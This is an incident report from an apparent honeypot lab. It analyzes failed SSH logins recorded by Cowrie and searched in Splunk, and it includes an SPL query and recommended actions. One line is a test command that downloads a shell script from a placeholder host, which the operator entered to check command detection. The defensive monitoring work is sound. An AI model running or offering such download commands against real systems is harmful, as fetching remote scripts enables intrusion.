# LunarShield SOC Incident Investigation Report

**Incident ID:** LS-001  
**System:** Cowrie SSH honeypot  
**SIEM:** Splunk Enterprise  
**Observation date:** October 31, 2026  
**Category:** Repeated SSH authentication failures  
**Assessment:** Suspicious authentication activity; attribution unconfirmed

## 1. Executive summary

Cowrie recorded repeated SSH authentication failures against accounts exposed by the honeypot. Events were forwarded to Splunk Enterprise and analyzed using SPL searches, dashboard panels, and alert rules.

The most active source in the reviewed data generated nine failed authentication attempts against `root` across nine unique sessions over approximately 84.25 seconds. Two other source addresses each generated one failed attempt. The operator's known testing source was excluded from the external-source summary.

The observed pattern is consistent with SSH password guessing. The available telemetry does not establish the identity or intent of the source operators.

## 2. Scope and environment

- Cowrie SSH honeypot on Ubuntu Server 24.04.
- Cloud VPS hosting.
- Splunk Universal Forwarder monitoring Cowrie JSON logs.
- Splunk Enterprise receiving events in `index=cowrie`.
- Private Tailscale connectivity between forwarder and SIEM.

## 3. Findings

### 3.1 Highest-volume source

| Attribute | Finding |
|---|---|
| Source | `[REDACTED-SOURCE-1]` |
| Target username | `root` |
| Failed attempts | 9 |
| Unique sessions | 9 |
| First observed | 20:37:43 (lab-local time) |
| Last observed | 20:39:07 (lab-local time) |
| Duration | 84.25 seconds |
| Average rate | 6.41 attempts/minute |
| Successful logins observed from this source | 0 in the reviewed result set |

### 3.2 Other observed sources

| Source | Failed attempts | Target username |
|---|---:|---|
| `[REDACTED-SOURCE-2]` | 1 | `support` |
| `[REDACTED-SOURCE-3]` | 1 | `root` |

The three sources above were external to the operator's known test IP in the reviewed search. This classification is not a determination of maliciousness.

### 3.3 Controlled suspicious-command test

The operator entered:

```text
wget http://example.invalid/test.sh
```

The command matched the suspicious-command SPL pattern. This was a controlled test originating from the operator's test source, not evidence that one of the external sources executed the command.

## 4. Detection logic

The lab implemented searches for:

- Failed and successful SSH authentication events.
- Failed authentication counts by source IP and username.
- Repeated failed attempts over a time window.
- Suspicious command strings in `cowrie.command.input`.
- SSH connection frequency over time.

Example failed-login summary:

```spl
index=cowrie earliest=-24h eventid="cowrie.login.failed"
| stats count as failed_attempts dc(session) as unique_sessions min(_time) as first_seen max(_time) as last_seen by src_ip username
| eval duration_seconds=round(last_seen-first_seen,2)
| eval attempts_per_minute=if(duration_seconds>0,round(failed_attempts/(duration_seconds/60),2),0)
```

## 5. Assessment

Nine failures against the `root` account in nine separate sessions over a short period are consistent with repeated password guessing. No successful authentication from that source appeared in the reviewed result set.

The evidence does not prove that the activity was automated, identify the operator, or establish that the source infrastructure was intentionally malicious.

## 6. Recommended actions

1. Continue monitoring authentication failures and source-IP recurrence.
2. Retain Cowrie logs securely and restrict access to raw logs.
3. Keep Splunk receiving ports private and limit administrative access.
4. Test alert thresholds and notification delivery with controlled traffic.
5. Expand command detection carefully and validate it against benign and suspicious examples.
6. Correlate future observations with reputable threat-intelligence sources, recording lookup date and confidence.
7. Periodically verify service health, log forwarding, and time synchronization.

## 7. Conclusion

The project demonstrates deployment of an SSH deception service, centralized log collection, SIEM searches, alerting, dashboard development, and initial incident analysis. It provides practical evidence of Linux administration, Cowrie, Splunk SPL, log analysis, and security documentation skills.

**Evidence caveat:** These findings describe the events available in the reviewed lab dataset and should not be presented as a confirmed compromise of a real system.
